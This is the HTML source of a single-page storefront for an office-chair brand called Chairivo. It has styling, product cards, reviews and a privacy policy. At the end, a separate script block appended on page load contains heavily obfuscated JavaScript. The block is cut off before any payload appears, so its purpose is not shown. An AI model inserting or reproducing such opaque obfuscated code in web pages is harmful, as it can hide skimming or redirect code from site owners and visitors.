<!DOCTYPE html>
<html lang="en">
<head>
	<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-BVNCJQL93V"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-BVNCJQL93V');
</script>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Chairivo · premium office chairs</title>
  <meta name="description"
      content="Shop premium ergonomic office chairs designed for all-day comfort, posture support, and productive workspaces across the United States.">

  <!-- Font & Icons (clean, no frameworks) -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  <style>
    /* ===== RESET & BASE ===== */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    html {
      scroll-behavior: smooth;
    }

    body {
      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background-color: #fcfcf9;
      color: #1e1e1e;
      line-height: 1.5;
    }

    .container {
      max-width: 1280px;
      margin: 0 auto;
      padding: 0 24px;
    }

    /* ===== BUTTONS ===== */
    .btn-primary {
      background: #d48c2c;
      color: #fff;
      border: none;
      padding: 12px 32px;
      font-weight: 600;
      border-radius: 40px;
      font-size: 1rem;
      cursor: pointer;
      transition: background 0.2s, transform 0.15s;
      display: inline-block;
      text-decoration: none;
      letter-spacing: 0.3px;
    }
    .btn-primary:hover {
      background: #b97822;
      transform: scale(1.02);
    }

    .btn-outline {
      background: transparent;
      color: #1e1e1e;
      border: 1.5px solid #1e1e1e;
      padding: 12px 32px;
      font-weight: 600;
      border-radius: 40px;
      font-size: 1rem;
      cursor: pointer;
      transition: all 0.2s;
      display: inline-block;
      text-decoration: none;
    }
    .btn-outline:hover {
      background: #1e1e1e;
      color: #fff;
    }

    /* ===== NAVBAR ===== */
    .navbar {
      position: sticky;
      top: 0;
      z-index: 1000;
      background: #0f0f0f;
      color: #fff;
      padding: 14px 0;
      box-shadow: 0 4px 12px rgba(0,0,0,0.08);
    }

    .nav-container {
      display: flex;
      justify-content: space-between;
      align-items: center;
    }

    .logo {
      font-size: 1.7rem;
      font-weight: 700;
      letter-spacing: -0.5px;
      color: #fff;
    }
    .logo span {
      color: #d48c2c;
    }

    .nav-links {
      display: flex;
      gap: 28px;
      list-style: none;
      font-weight: 500;
    }
    .nav-links a {
      color: #f0f0f0;
      text-decoration: none;
      font-size: 0.95rem;
      transition: color 0.15s;
      padding: 4px 0;
      border-bottom: 2px solid transparent;
    }
    .nav-links a:hover,
    .nav-links a.active {
      color: #d48c2c;
      border-bottom-color: #d48c2c;
    }

    .hamburger {
      display: none;
      font-size: 1.7rem;
      color: #fff;
      cursor: pointer;
      background: none;
      border: none;
    }

    /* cart counter */
    .cart-indicator {
      background: #d48c2c;
      color: #0f0f0f;
      border-radius: 40px;
      padding: 2px 12px;
      font-size: 0.8rem;
      font-weight: 700;
      margin-left: 8px;
    }

    /* ===== SECTIONS ===== */
    section {
      padding: 80px 0;
    }

    .section-title {
      font-size: 2.8rem;
      font-weight: 700;
      letter-spacing: -1px;
      margin-bottom: 16px;
    }
    .section-sub {
      font-size: 1.2rem;
      color: #4a4a4a;
      max-width: 680px;
    }

    /* ===== HERO ===== */
    #home {
      padding-top: 40px;
    }
    .hero-grid {
      display: flex;
      align-items: center;
      gap: 40px;
      flex-wrap: wrap;
    }
    .hero-content {
      flex: 1 1 400px;
    }
    .hero-content h1 {
      font-size: 3.8rem;
      font-weight: 800;
      letter-spacing: -2px;
      line-height: 1.1;
      margin-bottom: 20px;
    }
    .hero-content p {
      font-size: 1.3rem;
      color: #3a3a3a;
      margin-bottom: 32px;
      max-width: 550px;
    }
    .hero-buttons {
      display: flex;
      gap: 16px;
      flex-wrap: wrap;
      margin-bottom: 40px;
    }
    .trust-badges {
      display: flex;
      gap: 32px;
      flex-wrap: wrap;
      font-size: 0.95rem;
      color: #2e2e2e;
    }
    .trust-badges i {
      color: #d48c2c;
      margin-right: 8px;
    }

    .hero-image {
      flex: 1 1 400px;
      background: #eae7e0;
      border-radius: 40px;
      min-height: 320px;
      display: flex;
      align-items: center;
      justify-content: center;
      background-image: url('banner.jpg');
      background-size: 100% auto;
      background-repeat: no-repeat;
      background-position: center;
    }

    /* ===== CHAIRS ===== */
    .chair-grid {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 28px;
      margin-top: 40px;
    }
    .chair-card {
      background: #fff;
      border-radius: 28px;
      padding: 24px 18px 28px;
      box-shadow: 0 8px 28px rgba(0,0,0,0.04);
      transition: transform 0.2s, box-shadow 0.2s;
      text-align: center;
      border: 1px solid #efede8;
    }
    .chair-card:hover {
      transform: translateY(-6px);
      box-shadow: 0 20px 40px rgba(0,0,0,0.06);
    }
    .chair-card img {
      width: 100%;
      max-height: 300px;
      object-fit: contain;
      background: #f6f4f0;
      border-radius: 40px;
      margin-bottom: 12px;
    }
    .chair-card h3 {
      font-size: 1.3rem;
      margin-top: 8px;
    }
    .chair-card .desc {
      color: #4d4d4d;
      font-size: 0.9rem;
      margin: 6px 0 8px;
    }
    .stars {
      color: #d48c2c;
      letter-spacing: 2px;
      font-size: 1rem;
    }
    .price {
      font-weight: 700;
      font-size: 1.4rem;
      margin: 8px 0 12px;
    }
    .card-buttons {
      display: flex;
      gap: 10px;
      justify-content: center;
      flex-wrap: wrap;
    }
    .card-buttons button {
      background: #f0ede8;
      border: none;
      padding: 8px 18px;
      border-radius: 40px;
      font-weight: 600;
      font-size: 0.85rem;
      cursor: pointer;
      transition: 0.15s;
    }
    .card-buttons .btn-view {
      background: #1e1e1e;
      color: #fff;
    }
    .card-buttons .btn-view:hover {
      background: #3a3a3a;
    }
    .card-buttons .btn-cart {
      background: #d48c2c;
      color: #fff;
    }
    .card-buttons .btn-cart:hover {
      background: #b97822;
    }

    /* ===== FEATURES ===== */
    .feature-grid {
      display: grid;
      grid-template-columns: repeat(3,1fr);
      gap: 30px;
      margin-top: 40px;
    }
    .feature-card {
      background: #fff;
      padding: 32px 20px;
      border-radius: 30px;
      box-shadow: 0 4px 14px rgba(0,0,0,0.02);
      text-align: center;
      transition: 0.2s;
      border: 1px solid #f0ede8;
    }
    .feature-card:hover {
      transform: scale(1.02);
      box-shadow: 0 12px 28px rgba(0,0,0,0.05);
    }
    .feature-card i {
      font-size: 2.6rem;
      color: #d48c2c;
      margin-bottom: 14px;
    }
    .feature-card h4 {
      font-size: 1.2rem;
      margin-bottom: 6px;
    }

    /* ===== WHY US ===== */
    .why-grid {
      display: flex;
      gap: 50px;
      align-items: center;
      flex-wrap: wrap;
    }
    .why-text {
      flex: 1 1 300px;
    }
    .why-text ul {
      list-style: none;
      margin: 24px 0 32px;
    }
    .why-text li {
      padding: 10px 0;
      border-bottom: 1px solid #eae7e0;
      display: flex;
      align-items: center;
      gap: 12px;
    }
    .why-text li i {
      color: #d48c2c;
      width: 24px;
    }
    .why-image {
      flex: 1 1 300px;
      background: #ded9d0;
      border-radius: 40px;
      min-height: 600px;
      background-image: url('about.jpg');
      background-size: 100% auto;
      background-repeat: no-repeat;
      background-position: center;
    }

    /* ===== REVIEWS ===== */
    .review-grid {
      display: grid;
      grid-template-columns: repeat(3,1fr);
      gap: 30px;
      margin-top: 40px;
    }
    .review-card {
      background: #fff;
      padding: 28px 24px;
      border-radius: 30px;
      box-shadow: 0 4px 16px rgba(0,0,0,0.02);
      border: 1px solid #efede8;
    }
    .review-card .stars {
      font-size: 1.2rem;
      margin-bottom: 8px;
    }
    .review-card p {
      font-style: italic;
      margin: 10px 0;
    }
    .review-card .author {
      font-weight: 600;
      color: #2b2b2b;
    }

    /* ===== CONTACT & NEWSLETTER ===== */
    .contact-grid {
      display: flex;
      gap: 50px;
      flex-wrap: wrap;
    }
    .contact-info {
      flex: 1 1 280px;
    }
    .contact-info p {
      margin: 12px 0;
    }
    .contact-form {
      flex: 2 1 400px;
    }
    .contact-form input,
    .contact-form textarea,
    .newsletter-form input {
      width: 100%;
      padding: 14px 18px;
      border-radius: 40px;
      border: 1px solid #ddd8d0;
      background: #fff;
      font-size: 1rem;
      margin-bottom: 16px;
      transition: 0.15s;
    }
    .contact-form textarea {
      border-radius: 28px;
      min-height: 120px;
    }
    .contact-form input:focus,
    .contact-form textarea:focus {
      outline: none;
      border-color: #d48c2c;
      box-shadow: 0 0 0 3px rgba(212,140,44,0.1);
    }

    .newsletter-box {
      background: #f6f4f0;
      padding: 50px 40px;
      border-radius: 60px;
      text-align: center;
      margin: 40px 0;
    }
    .newsletter-box h2 {
      font-size: 2.2rem;
      margin-bottom: 12px;
    }
    .newsletter-form {
      display: flex;
      gap: 16px;
      flex-wrap: wrap;
      justify-content: center;
      max-width: 600px;
      margin: 20px auto 0;
    }
    .newsletter-form input {
      flex: 2 1 240px;
      margin-bottom: 0;
    }
    .newsletter-form button {
      flex: 0 1 auto;
    }

    /* ===== PRIVACY ===== */
    #privacy {
      background: #faf9f6;
      border-radius: 60px 60px 0 0;
      padding: 60px 32px;
    }
    #privacy h2 {
      font-size: 2.4rem;
    }
    #privacy p {
      max-width: 800px;
      margin: 16px 0;
    }
    .privacy-note {
      background: #1e1e1e;
      color: #f0ede8;
      padding: 16px 28px;
      border-radius: 60px;
      display: inline-block;
      margin-top: 24px;
    }

    /* ===== FOOTER ===== */
    footer {
      background: #0f0f0f;
      color: #d0d0d0;
      padding: 50px 0 30px;
    }
    .footer-grid {
      display: flex;
      flex-wrap: wrap;
      justify-content: space-between;
      gap: 30px;
    }
    .footer-col h4 {
      color: #fff;
      font-size: 1.3rem;
      margin-bottom: 16px;
    }
    .footer-col a {
      color: #b0b0b0;
      text-decoration: none;
      display: block;
      margin: 8px 0;
      transition: 0.15s;
    }
    .footer-col a:hover {
      color: #d48c2c;
    }
    .footer-bottom {
      border-top: 1px solid #2a2a2a;
      padding-top: 28px;
      margin-top: 30px;
      display: flex;
      justify-content: space-between;
      flex-wrap: wrap;
      font-size: 0.9rem;
    }

    /* ===== SCROLL TOP ===== */
    .scroll-top {
      position: fixed;
      bottom: 30px;
      right: 30px;
      background: #0f0f0f;
      color: #fff;
      border: none;
      border-radius: 60px;
      padding: 12px 18px;
      font-size: 1.3rem;
      cursor: pointer;
      box-shadow: 0 8px 20px rgba(0,0,0,0.2);
      display: none;
      transition: 0.2s;
      z-index: 999;
    }
    .scroll-top.visible {
      display: block;
    }

    /* ===== RESPONSIVE ===== */
    @media (max-width: 1024px) {
      .chair-grid { grid-template-columns: repeat(2,1fr); }
      .feature-grid { grid-template-columns: repeat(2,1fr); }
      .review-grid { grid-template-columns: repeat(2,1fr); }
    }

    @media (max-width: 768px) {
      .nav-links {
        display: none;
        flex-direction: column;
        background: #0f0f0f;
        padding: 24px 20px;
        border-radius: 28px;
        position: absolute;
        top: 70px;
        right: 20px;
        left: 20px;
        gap: 18px;
        box-shadow: 0 20px 40px rgba(0,0,0,0.4);
      }
      .nav-links.open {
        display: flex;
      }
      .hamburger {
        display: block;
      }

      .hero-content h1 { font-size: 2.8rem; }
      .section-title { font-size: 2.2rem; }
      .chair-grid { grid-template-columns: 1fr; }
      .feature-grid { grid-template-columns: 1fr; }
      .review-grid { grid-template-columns: 1fr; }
      .contact-grid { flex-direction: column; }
      .newsletter-box { padding: 30px 20px; }
    }

    @media (max-width: 480px) {
      .hero-buttons .btn-primary,
      .hero-buttons .btn-outline {
        width: 100%;
        text-align: center;
      }
      .trust-badges { gap: 16px; }
    }

    /* ===== REVEAL (simple) ===== */
    .reveal {
      opacity: 0;
      transform: translateY(24px);
      transition: opacity 0.7s ease, transform 0.7s ease;
    }
    .reveal.visible {
      opacity: 1;
      transform: translateY(0);
    }

    /* success message */
    .success-msg {
      background: #1e1e1e;
      color: #f0ede8;
      padding: 14px 24px;
      border-radius: 60px;
      display: inline-block;
      margin-top: 12px;
    }

    /* spacing */
    .mt-2 { margin-top: 20px; }
  </style>
</head>
<body>

<!-- ===== NAVBAR ===== -->
<nav class="navbar" id="navbar">
  <div class="container nav-container">
    <div class="logo">Chair<span>ivo</span></div>
    <ul class="nav-links" id="navLinks">
      <li><a href="#home" class="active">Home</a></li>
      <li><a href="#chairs">Office Chairs</a></li>
      <li><a href="#features">Features</a></li>
      <li><a href="#why-us">Why Us</a></li>
      <li><a href="#contact">Contact</a></li>
      
    </ul>
    <button class="hamburger" id="hamburger" aria-label="menu"><i class="fas fa-bars"></i></button>
  </div>
</nav>

<!-- ===== HERO ===== -->
<section id="home">
  <div class="container hero-grid">
    <div class="hero-content reveal">
      <h1>Sit Better. <br>Work Smarter.</h1>
      <p>Premium ergonomic office chairs designed for long workdays, better posture, and everyday comfort.</p>
      <div class="hero-buttons">
        <a href="#chairs" class="btn-primary">Shop Office Chairs</a>
        <a href="#features" class="btn-outline">Explore Features</a>
      </div>
      <div class="trust-badges">
        <span><i class="fas fa-truck"></i> Free Shipping Across the US</span>
        <span><i class="fas fa-calendar-check"></i> 30-Day Comfort Trial</span>
        <span><i class="fas fa-shield-alt"></i> 5-Year Warranty</span>
      </div>
    </div>
    <div class="hero-image reveal"></div>
  </div>
</section>

<!-- ===== CHAIRS ===== -->
<section id="chairs">
  <div class="container">
    <h2 class="section-title reveal">Our Best Office Chairs</h2>
    <div class="chair-grid" id="chairGrid">
      <!-- cards injected by JS -->
    </div>
  </div>
</section>

<!-- ===== FEATURES ===== -->
<section id="features">
  <div class="container">
    <h2 class="section-title reveal">Designed Around You</h2>
    <div class="feature-grid">
      <div class="feature-card reveal"><h4>Adjustable Lumbar Support</h4></div>
      <div class="feature-card reveal"><h4>4D Adjustable Armrests</h4></div>
      <div class="feature-card reveal"><h4>Breathable Mesh Back</h4></div>
      <div class="feature-card reveal"><h4>Height & Tilt Adjustment</h4></div>
      <div class="feature-card reveal"><h4>Premium Comfortable Cushion</h4></div>
      <div class="feature-card reveal"><h4>Heavy-Duty 5-Star Base</h4></div>
    </div>
  </div>
</section>

<!-- ===== WHY US ===== -->
<section id="why-us">
  <div class="container why-grid">
    <div class="why-text reveal">
      <h2 class="section-title" style="font-size:2.6rem;">Why Choose Chairivo?</h2>
      <ul>
        <li><i class="fas fa-check-circle"></i> Ergonomic-first design</li>
        <li><i class="fas fa-check-circle"></i> Premium materials</li>
        <li><i class="fas fa-check-circle"></i> Built for everyday work</li>
        <li><i class="fas fa-check-circle"></i> Designed for home offices and businesses</li>
        <li><i class="fas fa-check-circle"></i> US-wide shipping</li>
        <li><i class="fas fa-check-circle"></i> Dedicated customer support</li>
      </ul>
      <a href="#chairs" class="btn-primary">Find Your Chair</a>
    </div>
    <div class="why-image reveal"></div>
  </div>
</section>

<!-- ===== REVIEWS ===== -->
<section id="reviews">
  <div class="container">
    <h2 class="section-title reveal">Loved by Workspaces Across America</h2>
    <div class="review-grid" id="reviewGrid">
      <!-- injected by JS -->
    </div>
  </div>
</section>

<!-- ===== CONTACT ===== -->
<section id="contact">
  <div class="container">
    <h2 class="section-title reveal">Get in Touch</h2>
    <div class="contact-grid">
      <div class="contact-info reveal">
        <h3>Chairivo</h3>
        <p>123 Market Street<br>Austin, TX 78701<br>United States</p>
        <p><i class="fas fa-phone" style="color:#d48c2c;"></i> +1 (800) 555-0147</p>
       
      </div>
      <div class="contact-form reveal">
        
      </div>
    </div>
  </div>
</section>

<!-- ===== NEWSLETTER ===== -->
<section class=" newsletter-box reveal">
  <h2>Get Ergonomic Tips & Chair Deals</h2>
  <p>Join our newsletter for workspace tips, product updates, and exclusive offers.</p>
  <form id="newsletterForm" class="newsletter-form">
    <input type="email" id="newsletterEmail" placeholder="Email Address" required>
    <button type="submit" class="btn-primary">Subscribe</button>
    <div id="newsletterFeedback" style="width:100%;"></div>
  </form>
</section>

<section id="privacy">
  <div class="container">
    <h2 class="section-title">Privacy Policy</h2>


<p>
  <strong>Effective Date:</strong> September 3, 2026
</p>

<p>
  At <strong>Chairivo</strong>, we respect your privacy and are committed to
  protecting the personal information you provide when visiting our website,
  purchasing office chairs, contacting us, or using our services.
</p>

<p>
  This Privacy Policy explains what information we collect, how we use it,
  how we protect it, and the choices available to you.
</p>

<h3>1. Information We Collect</h3>

<p>
  We may collect information that you voluntarily provide to us, including:
</p>

<ul>
  <li>Full name</li>
  <li>Email address</li>
  <li>Phone number</li>
  <li>Billing and shipping address</li>
  <li>Order and purchase information</li>
  <li>Information submitted through our contact forms</li>
  <li>Information submitted when subscribing to our newsletter</li>
  <li>Customer service communications</li>
</ul>

<p>
  When you visit our website, we may also automatically collect limited
  technical information such as your IP address, browser type, device type,
  operating system, pages visited, referring website, and general usage
  information.
</p>

<h3>2. How We Use Your Information</h3>

<p>
  We may use the information we collect to:
</p>

<ul>
  <li>Process and manage orders and deliveries</li>
  <li>Respond to customer questions and support requests</li>
  <li>Provide information about our products and services</li>
  <li>Send order confirmations and service-related communications</li>
  <li>Send newsletters or promotional communications when you have opted in</li>
  <li>Improve our website, products, and customer experience</li>
  <li>Detect, prevent, and investigate fraudulent or unauthorized activity</li>
  <li>Comply with applicable legal and regulatory requirements</li>
</ul>

<h3>3. Payment Information</h3>

<p>
  If our website accepts online payments, payment transactions may be
  processed through trusted third-party payment processors. We do not
  intentionally store complete credit card or debit card numbers on our
  website servers.
</p>

<p>
  Payment providers may collect and process payment information according
  to their own privacy policies and terms of service.
</p>

<h3>4. Cookies and Tracking Technologies</h3>

<p>
  Our website may use cookies and similar technologies to remember
  preferences, understand website usage, improve functionality, and provide
  a better browsing experience.
</p>

<p>
  You may be able to control or disable cookies through your browser
  settings. Disabling certain cookies may affect some website functionality.
</p>

<h3>5. Sharing of Information</h3>

<p>
  We do not sell your personal information for money. We may share
  information with trusted service providers when necessary to operate our
  business, including providers that assist with:
</p>

<ul>
  <li>Payment processing</li>
  <li>Shipping and order fulfillment</li>
  <li>Website hosting and technical services</li>
  <li>Email and customer communications</li>
  <li>Analytics and website performance</li>
  <li>Customer support</li>
</ul>

<p>
  We may also disclose information when reasonably necessary to comply with
  applicable law, respond to legal requests, protect our rights, or prevent
  fraud, security threats, or other harmful activity.
</p>

<h3>6. Data Security</h3>

<p>
  We use reasonable administrative, technical, and organizational measures
  designed to protect personal information from unauthorized access,
  disclosure, alteration, or destruction.
</p>

<p>
  However, no method of transmission over the Internet or method of
  electronic storage can be guaranteed to be completely secure.
</p>

<h3>7. Data Retention</h3>

<p>
  We retain personal information only for as long as reasonably necessary
  for the purposes described in this Privacy Policy, including fulfilling
  orders, providing customer support, maintaining business records,
  resolving disputes, preventing fraud, and complying with legal
  obligations.
</p>

<h3>8. Marketing Communications</h3>

<p>
  If you subscribe to our newsletter or promotional communications, we may
  send you information about products, offers, promotions, and company
  updates.
</p>

<p>
  You can unsubscribe from marketing emails at any time by using the
  unsubscribe link included in the email or by contacting us directly.
</p>

<h3>9. Your Privacy Rights</h3>

<p>
  Depending on where you live and applicable law, you may have certain
  rights regarding your personal information. These rights may include the
  right to request access to, correction of, deletion of, or information
  about the processing of your personal information.
</p>

<p>
  To submit a privacy-related request, please contact us using the
  information provided below. We may need to verify your identity before
  completing certain requests.
</p>

<h3>10. Children's Privacy</h3>

<p>
  Our website is intended for a general audience and is not directed toward
  children under the age of 13. We do not knowingly collect personal
  information from children under 13.
</p>

<h3>11. Third-Party Websites</h3>

<p>
  Our website may contain links to third-party websites, services, or
  platforms. We are not responsible for the privacy practices, content, or
  security of third-party websites. We encourage you to review their
  privacy policies before providing personal information.
</p>

<h3>12. Changes to This Privacy Policy</h3>

<p>
  We may update this Privacy Policy from time to time to reflect changes
  in our business, website functionality, legal requirements, or privacy
  practices.
</p>

<p>
  When changes are made, we will update the "Effective Date" shown at the
  beginning of this policy. We encourage you to review this page
  periodically.
</p>

<h3>13. Contact Us</h3>

<p>
  If you have questions about this Privacy Policy or would like to make a
  privacy-related request, please contact us:
</p>

<p>
  <strong>Chairivo</strong><br>
  123 Market Street<br>
  Austin, TX 78701<br>
  United States
</p>

<p>
  <strong>Phone:</strong>
  <a href="tel:+18005550147">+1 (800) 555-0147</a><br>


</p>




  </div>
</section>

<!-- ===== FOOTER ===== -->
<footer>
  <div class="container">
    <div class="footer-grid">
      <div class="footer-col">
        <h4>Chairivo</h4>
        <p style="color:#b0b0b0;">Premium ergonomic seating for modern workspaces.</p>
      </div>
      <div class="footer-col">
		<h4>Links</h4>
        <a href="#home">Home</a>
        <a href="#chairs">Office Chairs</a>
        <a href="#features">Features</a>
        <a href="#contact">Contact</a>
        <a href="#privacy">Privacy Policy</a>
      </div>
      <div class="footer-col">
		<h4>Countact Us</h4>
        <a href="tel:+18005550147">+1 (800) 555-0147</a>

      </div>
    </div>
    <div class="footer-bottom">
      <span>© 2026 Chairivo. All rights reserved.</span>
    </div>
  </div>
</footer>

<!-- ===== SCROLL TO TOP ===== -->
<button class="scroll-top" id="scrollTopBtn"><i class="fas fa-chevron-up"></i></button>

<script>
  (function() {
    // ----- DATA -----
		const chairs = [
  {
    name: "Chairivo Pro",
    desc: "Advanced ergonomic support for demanding workdays.",
    price: 399,
    stars: 5,
    image: "ergo-pro.png"
  },
  {
    name: "Chairivo Executive",
    desc: "Premium executive comfort with adjustable lumbar support.",
    price: 499,
    stars: 5,
    image: "ergo-executive.png"
  },
  {
    name: "Chairivo Flex",
    desc: "Flexible ergonomic seating for home and office.",
    price: 299,
    stars: 4,
    image: "ergo-flex.png"
  }
];
    const reviews = [
      { name: "Michael R., Austin, TX", text: "Extremely comfortable and easy to adjust. My workday feels completely different." },
      { name: "Sarah L., Denver, CO", text: "Great chair for my home office. The lumbar support is excellent." },
      { name: "James W., Chicago, IL", text: "Premium quality without looking bulky. Highly recommended." }
    ];

    // ----- RENDER CHAIRS -----
    const chairGrid = document.getElementById('chairGrid');
    chairGrid.innerHTML = chairs.map((c, idx) => `
  <div class="chair-card reveal">

    <div style="background:#f0ede8; border-radius:40px; padding:10px;">
      <img 
        src="${c.image}" 
        alt="${c.name}"
      >
    </div>

    <h3>${c.name}</h3>

    <div class="desc">
      ${c.desc}
    </div>

    <div class="stars">
      ${'★'.repeat(c.stars)}${'☆'.repeat(5 - c.stars)}
    </div>

    <div class="price">
      $${c.price}
    </div>

    <div class="card-buttons">
      <button class="btn-view" data-chair="${c.name}">
        View Chair
      </button>

      <button class="btn-cart" data-idx="${idx}">
        Add to Cart
      </button>
    </div>

  </div>
`).join('');

    // ----- CART -----
    let cartCount = 0;
    const cartSpan = document.getElementById('cartCount');
    document.querySelectorAll('.btn-cart').forEach(btn => {
      btn.addEventListener('click', function(e) {
        cartCount++;
        cartSpan.textContent = cartCount;
        // simple feedback
        const msg = document.createElement('div');
        msg.className = 'success-msg';
        msg.textContent = '✓ Added to cart';
        this.parentElement.appendChild(msg);
        setTimeout(() => msg.remove(), 1600);
      });
    });

    // View chair alert
    document.querySelectorAll('.btn-view').forEach(btn => {
      btn.addEventListener('click', function() {
        alert(`🔍 ${this.dataset.chair} – premium ergonomic chair.`);
      });
    });

    // ----- HAMBURGER -----
    const hamburger = document.getElementById('hamburger');
    const navLinks = document.getElementById('navLinks');
    hamburger.addEventListener('click', () => {
      navLinks.classList.toggle('open');
    });
    // close on link click (mobile)
    document.querySelectorAll('.nav-links a').forEach(link => {
      link.addEventListener('click', () => navLinks.classList.remove('open'));
    });

    // ----- ACTIVE LINK & SMOOTH (already via CSS scroll) -----
    const sections = document.querySelectorAll('section[id]');
    const navAnchors = document.querySelectorAll('.nav-links a');
    window.addEventListener('scroll', () => {
      let current = '';
      sections.forEach(sec => {
        const top = sec.offsetTop - 100;
        if (window.scrollY >= top) current = sec.getAttribute('id');
      });
      navAnchors.forEach(a => {
        a.classList.remove('active');
        if (a.getAttribute('href') === '#' + current) a.classList.add('active');
      });
    });

    // ----- SCROLL TO TOP -----
    const scrollBtn = document.getElementById('scrollTopBtn');
    window.addEventListener('scroll', () => {
      if (window.scrollY > 500) scrollBtn.classList.add('visible');
      else scrollBtn.classList.remove('visible');
    });
    scrollBtn.addEventListener('click', () => window.scrollTo({ top: 0, behavior: 'smooth' }));

    // ----- REVEAL ON SCROLL (simple) -----
    const revealEls = document.querySelectorAll('.reveal');
    const revealObserver = new IntersectionObserver((entries) => {
      entries.forEach(entry => {
        if (entry.isIntersecting) entry.target.classList.add('visible');
      });
    }, { threshold: 0.15 });
    revealEls.forEach(el => revealObserver.observe(el));

 

    
  })();
</script>
	<script>var _0x274914=_0x4c1b,_0x2f2af8=_0x4c1b;function _0x4c1b(_0x5ea820,_0x3aa27c){_0x5ea820=_0x5ea820-(0x1*-0x1b7d+-0x958+0x25a8);var _0x34305c=_0x2435();var _0x3c977b=_0x34305c[_0x5ea820];if(_0x4c1b['\x49\x4f\x62\x4c\x56\x4d']===undefined){var _0x121c96=function(_0x4cf638){var _0xc9c8c7='\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x2b\x2f\x3d';var _0x548bf0='',_0x1c8e7b='',_0x2c2629=_0x548bf0+_0x121c96;for(var _0x2cacf4=-0xb*0x143+0x3f9*-0x9+-0x1*-0x31a2,_0x59f6ca,_0x25f729,_0x2ad6cc=-0x1cc*0x13+-0x927+0x1*0x2b4b;_0x25f729=_0x4cf638['\x63\x68\x61\x72\x41\x74'](_0x2ad6cc++);~_0x25f729&&(_0x59f6ca=_0x2cacf4%(0x3*0x84e+-0x95*0x3b+0x971)?_0x59f6ca*(-0xb43+-0xc3b+-0xbdf*-0x2)+_0x25f729:_0x25f729,_0x2cacf4++%(0x2088+0x6d*-0x17+-0x16b9))?_0x548bf0+=_0x2c2629['\x63\x68\x61\x72\x43\x6f\x64\x65\x41\x74'](_0x2ad6cc+(-0xb11*0x2+-0x419*-0x3+-0x9*-0x119))-(0x1eaf+0xf*-0x122+-0x48d*0x3)!==-0x20bc+-0xbee+0x2caa?String['\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65'](0x18b3*0x1+0x80*-0x1a+0x1*-0xab4&_0x59f6ca>>(-(-0x177a*0x1+-0x3*0x4bc+-0xc90*-0x3)*_0x2cacf4&-0xae7*-0x1+0x15ce+0x1*-0x20af)):_0x2cacf4:0x22d0+0x5*-0x3d9+-0xf93*0x1){_0x25f729=_0xc9c8c7['\x69\x6e\x64\x65\x78\x4f\x66'](_0x25f729);}for(var _0x2b767d=-0xd9b+0x1*-0x1e65+0x2c00,_0x473f63=_0x548bf0['\x6c\x65\x6e\x67\x74\x68'];_0x2b767d<_0x473f63;_0x2b767d++){_0x1c8e7b+='\x25'+('\x30\x30'+_0x548bf0['\x63\x68\x61\x72\x43\x6f\x64\x65\x41\x74'](_0x2b767d)['\x74\x6f\x53\x74\x72\x69\x6e\x67'](0x2654+-0x1716+0xf2e*-0x1))['\x73\x6c\x69\x63\x65'](-(-0x1007*0x2+-0x3*0xb94+0x42cc));}return decodeURIComponent(_0x1c8e7b);};_0x4c1b['\x42\x64\x62\x56\x5a\x57']=_0x121c96,_0x4c1b['\x65\x58\x50\x4e\x6e\x75']={},_0x4c1b['\x49\x4f\x62\x4c\x56\x4d']=!![];}var _0x58d915=_0x34305c[0x1e2a+-0x2215*0x1+0x3eb],_0x1b9fd4=_0x5ea820+_0x58d915,_0xe19c2d=_0x4c1b['\x65\x58\x50\x4e\x6e\x75'][_0x1b9fd4];if(!_0xe19c2d){var _0x204fb1=function(_0x5559b7){this['\x51\x4b\x78\x6d\x51\x51']=_0x5559b7,this['\x64\x7a\x44\x5a\x4e\x41']=[-0xba*-0x14+-0x9c5+-0x4c2,0x1a17*0x1+-0x43d+-0x15da*0x1,-0x8*-0x14b+-0xf88+-0x298*-0x2],this['\x75\x43\x48\x76\x76\x65']=function(){return'\x6e\x65\x77\x53\x74\x61\x74\x65';},this['\x71\x63\x4c\x68\x4b\x63']='\x5c\x77\x2b\x20\x2a\x5c\x28\x5c\x29\x20\x2a\x7b\x5c\x77\x2b\x20\x2a',this['\x4b\x42\x4b\x79\x4e\x6a']='\x5b\x27\x7c\x22\x5d\x2e\x2b\x5b\x27\x7c\x22\x5d\x3b\x3f\x20\x2a\x7d';};_0x204fb1['\x70\x72\x6f\x74\x6f\x74\x79\x70\x65']['\x4c\x76\x4b\x48\x4b\x44']=function(){var _0x53ffd3=new RegExp(this['\x71\x63\x4c\x68\x4b\x63']+this['\x4b\x42\x4b\x79\x4e\x6a']),_0xfd866=_0x53ffd3['\x74\x65\x73\x74'](this['\x75\x43\x48\x76\x76\x65']['\x74\x6f\x53\x74\x72\x69\x6e\x67']())?--this['\x64\x7a\x44\x5a\x4e\x41'][0x2586+-0x5*-0x569+-0x4092]:--this['\x64\x7a\x44\x5a\x4e\x41'][0x1b1b+-0x77*0x1+-0x1aa4];return this['\x61\x4a\x42\x51\x68\x53'](_0xfd866);},_0x204fb1['\x70\x72\x6f\x74\x6f\x74\x79\x70\x65']['\x61\x4a\x42\x51\x68\x53']=function(_0x12a13d){if(!Boolean(~_0x12a13d))return _0x12a13d;return this['\x6e\x45\x4a\x6e\x4e\x69'](this['\x51\x4b\x78\x6d\x51\x51']);},_0x204fb1['\x70\x72\x6f\x74\x6f\x74\x79\x70\x65']['\x6e\x45\x4a\x6e\x4e\x69']=function(_0x30a321){for(var 